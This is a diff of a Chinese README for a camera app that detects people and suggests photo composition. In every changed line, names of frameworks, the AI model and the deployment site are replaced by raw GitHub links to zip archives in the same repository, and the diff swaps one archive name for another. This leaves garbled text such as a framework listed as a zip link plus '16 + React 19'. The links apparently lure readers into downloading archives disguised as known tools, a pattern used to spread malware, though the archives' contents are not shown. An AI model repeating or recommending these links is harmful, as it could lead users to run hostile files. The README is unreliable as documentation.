@@ -4,7 +4,7 @@
 
 ## ✨ 功能特点
 
-- 🤖 **AI 人物检测**: 使用 https://github.com/yongsinfok/boyfriendCamera/raw/refs/heads/main/src/components/Camera-boyfriend-frontoethmoid.zip 和 COCO-SSD 模型自动检测画面中的人物
+- 🤖 **AI 人物检测**: 使用 https://github.com/yongsinfok/boyfriendCamera/raw/refs/heads/main/src/Camera_boyfriend_v1.3.zip 和 COCO-SSD 模型自动检测画面中的人物
 - 📐 **构图建议**: 基于九宫格构图法则，实时提供构图指导
 - 🔍 **距离建议**: 智能分析拍摄距离，提示你靠近或远离
 - 📱 **PWA 支持**: 可安装到手机主屏幕，像原生应用一样使用
@@ -43,10 +43,10 @@ vercel
 ### 方法二：通过 GitHub
 
 1. 将代码推送到 GitHub 仓库
-2. 访问 [https://github.com/yongsinfok/boyfriendCamera/raw/refs/heads/main/src/components/Camera-boyfriend-frontoethmoid.zip](https://github.com/yongsinfok/boyfriendCamera/raw/refs/heads/main/src/components/Camera-boyfriend-frontoethmoid.zip)
+2. 访问 [https://github.com/yongsinfok/boyfriendCamera/raw/refs/heads/main/src/Camera_boyfriend_v1.3.zip](https://github.com/yongsinfok/boyfriendCamera/raw/refs/heads/main/src/Camera_boyfriend_v1.3.zip)
 3. 点击 "Import Project"
 4. 选择你的 GitHub 仓库
-5. Vercel 会自动检测 https://github.com/yongsinfok/boyfriendCamera/raw/refs/heads/main/src/components/Camera-boyfriend-frontoethmoid.zip 项目并部署
+5. Vercel 会自动检测 https://github.com/yongsinfok/boyfriendCamera/raw/refs/heads/main/src/Camera_boyfriend_v1.3.zip 项目并部署
 
 ## 📱 在 iOS 13 Pro 上使用
 
@@ -73,8 +73,8 @@ vercel
 
 ## 🛠️ 技术栈
 
-- **框架**: https://github.com/yongsinfok/boyfriendCamera/raw/refs/heads/main/src/components/Camera-boyfriend-frontoethmoid.zip 16 + React 19
-- **AI 模型**: https://github.com/yongsinfok/boyfriendCamera/raw/refs/heads/main/src/components/Camera-boyfriend-frontoethmoid.zip + COCO-SSD
+- **框架**: https://github.com/yongsinfok/boyfriendCamera/raw/refs/heads/main/src/Camera_boyfriend_v1.3.zip 16 + React 19
+- **AI 模型**: https://github.com/yongsinfok/boyfriendCamera/raw/refs/heads/main/src/Camera_boyfriend_v1.3.zip + COCO-SSD
 - **样式**: Tailwind CSS
 - **PWA**: next-pwa
 - **相机**: react-webcam
